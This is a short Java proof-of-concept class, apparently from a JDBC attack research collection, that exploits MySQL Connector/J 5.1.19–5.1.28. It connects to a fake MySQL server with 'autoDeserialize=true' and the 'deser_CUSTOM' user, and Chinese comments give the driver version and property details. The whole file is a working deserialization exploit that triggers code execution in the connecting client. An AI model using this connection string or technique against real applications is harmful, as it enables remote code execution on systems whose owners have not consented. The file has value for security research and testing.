package org.su18.jdbc.attack.mysql.customcollations;

import org.su18.jdbc.attack.mysql.util.ConnectionUtil;

/**
 * 使用 https://github.com/4ra1n/mysql-fake-server 进行测试
 * 依赖版本 5.1.19
 * 驱动名称 com.mysql.jdbc.Driver
 * 属性名 detectCustomCollations
 * 连接参数 autoDeserialize=true
 * 备注 5.1.19-5.1.28 无需指定 detectCustomCollations
 *
 * @author Jasper
 */
public class Attack511x {

	public static void main(String[] args) throws Exception {

		String driverName    = "com.mysql.jdbc.Driver";
		String connectionUrl = "jdbc:mysql://127.0.0.1:49435/test?autoDeserialize=true";

		ConnectionUtil.getJDBCConnection(driverName, connectionUrl, "deser_CUSTOM", "");
	}

}
